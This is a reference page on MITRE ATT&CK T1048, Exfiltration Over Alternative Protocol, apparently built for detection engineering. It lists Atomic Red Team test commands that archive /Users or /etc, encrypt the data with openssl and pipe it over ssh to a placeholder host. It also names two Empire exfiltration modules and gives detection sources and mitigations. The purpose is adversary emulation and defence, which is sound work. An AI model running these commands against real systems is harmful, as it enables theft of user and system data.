
# Exfiltration Over Alternative Protocol

## Description

### MITRE Description

> Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  

Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 

[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) 

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: True
* Permissions: None
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1048

## Potential Commands

```
tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@target.example.com 'cat > /Users.tar.gz.enc'
tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh atomic@#{domain} 'cat > /Users.tar.gz.enc'
ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
powershell/exfiltration/exfil_dropbox
exfiltration/Invoke_ExfilDataToGitHub
```

## Commands Dataset

```
[{'command': 'ssh target.example.com "(cd /etc && tar -zcvf - *)" > '
             './etc.tar.gz\n',
  'name': None,
  'source': 'atomics/T1048/T1048.yaml'},
 {'command': 'tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh '
             "atomic@#{domain} 'cat > /Users.tar.gz.enc'\n",
  'name': None,
  'source': 'atomics/T1048/T1048.yaml'},
 {'command': 'tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh '
             "#{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n",
  'name': None,
  'source': 'atomics/T1048/T1048.yaml'},
 {'command': 'tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh '
             "#{user_name}@target.example.com 'cat > /Users.tar.gz.enc'\n",
  'name': None,
  'source': 'atomics/T1048/T1048.yaml'},
 {'command': 'powershell/exfiltration/exfil_dropbox',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/exfiltration/exfil_dropbox',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'exfiltration/Invoke_ExfilDataToGitHub',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'exfiltration/Invoke_ExfilDataToGitHub',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': ['4688', 'Process Execution']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Netflow/Enclave netflow']},
 {'data_source': ['Network protocol analysis']},
 {'data_source': ['User interface']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['5156', 'Windows Firewall']},
 {'data_source': ['Packet capture']},
 {'data_source': ['Netflow/Enclave netflow']},
 {'data_source': ['Network protocol analysis']},
 {'data_source': ['User interface']}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Exfiltration Over Alternative Protocol': {'atomic_tests': [{'auto_generated_guid': 'f6786cc8-beda-4915-a4d6-ac2f193bb988',
                                                                                      'description': 'Input '
                                                                                                     'a '
                                                                                                     'domain '
                                                                                                     'and '
                                                                                                     'test '
                                                                                                     'Exfiltration '
                                                                                                     'over '
                                                                                                     'SSH\n'
                                                                                                     '\n'
                                                                                                     'Remote '
                                                                                                     'to '
                                                                                                     'Local\n'
                                                                                                     '\n'
                                                                                                     'Upon '
                                                                                                     'successful '
                                                                                                     'execution, '
                                                                                                     'sh '
                                                                                                     'will '
                                                                                                     'spawn '
                                                                                                     'ssh '
                                                                                                     'contacting '
                                                                                                     'a '
                                                                                                     'remote '
                                                                                                     'domain '
                                                                                                     '(default: '
                                                                                                     'target.example.com) '
                                                                                                     'writing '
                                                                                                     'a '
                                                                                                     'tar.gz '
                                                                                                     'file.\n',
                                                                                      'executor': {'command': 'ssh '
                                                                                                              '#{domain} '
                                                                                                              '"(cd '
                                                                                                              '/etc '
                                                                                                              '&& '
                                                                                                              'tar '
                                                                                                              '-zcvf '
                                                                                                              '- '
                                                                                                              '*)" '
                                                                                                              '> '
                                                                                                              './etc.tar.gz\n',
                                                                                                   'name': 'sh'},
                                                                                      'input_arguments': {'domain': {'default': 'target.example.com',
                                                                                                                     'description': 'target '
                                                                                                                                    'SSH '
                                                                                                                                    'domain',
                                                                                                                     'type': 'url'}},
                                                                                      'name': 'Exfiltration '
                                                                                              'Over '
                                                                                              'Alternative '
                                                                                              'Protocol '
                                                                                              '- '
                                                                                              'SSH',
                                                                                      'supported_platforms': ['macos',
                                                                                                              'linux']},
                                                                                     {'auto_generated_guid': '7c3cb337-35ae-4d06-bf03-3032ed2ec268',
                                                                                      'description': 'Input '
                                                                                                     'a '
                                                                                                     'domain '
                                                                                                     'and '
                                                                                                     'test '
                                                                                                     'Exfiltration '
                                                                                                     'over '
                                                                                                     'SSH\n'
                                                                                                     '\n'
                                                                                                     'Local '
                                                                                                     'to '
                                                                                                     'Remote\n'
                                                                                                     '\n'
                                                                                                     'Upon '
                                                                                                     'successful '
                                                                                                     'execution, '
                                                                                                     'tar '
                                                                                                     'will '
                                                                                                     'compress '
                                                                                                     '/Users/* '
                                                                                                     'directory '
                                                                                                     'and '
                                                                                                     'password '
                                                                                                     'protect '
                                                                                                     'the '
                                                                                                     'file '
                                                                                                     'modification '
                                                                                                     'of '
                                                                                                     '`Users.tar.gz.enc` '
                                                                                                     'as '
                                                                                                     'output.\n',
                                                                                      'executor': {'command': 'tar '
                                                                                                              'czpf '
                                                                                                              '- '
                                                                                                              '/Users/* '
                                                                                                              '| '
                                                                                                              'openssl '
                                                                                                              'des3 '
                                                                                                              '-salt '
                                                                                                              '-pass '
                                                                                                              '#{password} '
                                                                                                              '| '
                                                                                                              'ssh '
                                                                                                              '#{user_name}@#{domain} '
                                                                                                              "'cat "
                                                                                                              '> '
                                                                                                              "/Users.tar.gz.enc'\n",
                                                                                                   'name': 'sh'},
                                                                                      'input_arguments': {'domain': {'default': 'target.example.com',
                                                                                                                     'description': 'target '
                                                                                                                                    'SSH '
                                                                                                                                    'domain',
                                                                                                                     'type': 'url'},
                                                                                                          'password': {'default': 'atomic',
                                                                                                                       'description': 'password '
                                                                                                                                      'for '
                                                                                                                                      'user',
                                                                                                                       'type': 'string'},
                                                                                                          'user_name': {'default': 'atomic',
                                                                                                                        'description': 'username '
                                                                                                                                       'for '
                                                                                                                                       'domain',
                                                                                                                        'type': 'string'}},
                                                                                      'name': 'Exfiltration '
                                                                                              'Over '
                                                                                              'Alternative '
                                                                                              'Protocol '
                                                                                              '- '
                                                                                              'SSH',
                                                                                      'supported_platforms': ['macos',
                                                                                                              'linux']}],
                                                                    'attack_technique': 'T1048',
                                                                    'display_name': 'Exfiltration '
                                                                                    'Over '
                                                                                    'Alternative '
                                                                                    'Protocol'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1048',
                                            'ATT&CK Technique #2': 'T1071',
                                            'Concatenate for Python Dictionary': '"powershell/exfiltration/exfil_dropbox":  '
                                                                                 '["T1048","T1071"],',
                                            'Empire Module': 'powershell/exfiltration/exfil_dropbox',
                                            'Technique': 'Exfiltration Over '
                                                         'Alternative '
                                                         'Protocol'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1048',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"exfiltration/Invoke_ExfilDataToGitHub":  '
                                                                                 '["T1048"],',
                                            'Empire Module': 'exfiltration/Invoke_ExfilDataToGitHub',
                                            'Technique': 'Exfiltration Over '
                                                         'Alternative '
                                                         'Protocol'}}]
```

# Tactics


* [Exfiltration](../tactics/Exfiltration.md)


# Mitigations


* [Network Segmentation](../mitigations/Network-Segmentation.md)

* [Network Intrusion Prevention](../mitigations/Network-Intrusion-Prevention.md)
    
* [Filter Network Traffic](../mitigations/Filter-Network-Traffic.md)
    

# Actors

None
